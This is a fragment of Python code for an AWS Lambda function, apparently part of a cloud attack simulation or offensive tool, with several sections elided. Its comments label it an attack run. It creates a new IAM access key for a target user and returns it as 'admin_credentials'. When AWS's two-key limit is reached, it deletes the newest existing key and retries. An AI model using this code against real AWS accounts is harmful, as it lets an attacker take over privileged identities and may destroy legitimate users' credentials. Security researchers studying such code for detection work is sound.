...
def lambda_handler(event, context):
    ...
    # AWS allows max 2 keys per user. If a previous attack run already
    # created a key, we may hit the limit. In that case, delete the
    # newest key (likely attacker-created) and retry.
    try:
        ...
        # Max 2 keys -- delete the newest one (from a previous attack run)
        try:
            existing = iam.list_access_keys(UserName=target_user)
            keys = sorted(
                existing["AccessKeyMetadata"],
                key=lambda k: str(k.get("CreateDate", "")),
            )
            if len(keys) >= 2:
                victim_key = keys[-1]["AccessKeyId"]  # newest = attacker's
                iam.delete_access_key(
                    UserName=target_user, AccessKeyId=victim_key
                )
                results["deleted_old_key"] = victim_key
                # Retry
                new_key = iam.create_access_key(UserName=target_user)
                results["admin_credentials"] = {
                    "AccessKeyId": new_key["AccessKey"]["AccessKeyId"],
                ...
                results["key_creation_error"] = "LimitExceeded but fewer than 2 keys found"
        except Exception as e2:
            results["key_creation_error"] = f"LimitExceeded recovery failed: {e2}"
    except Exception as e:
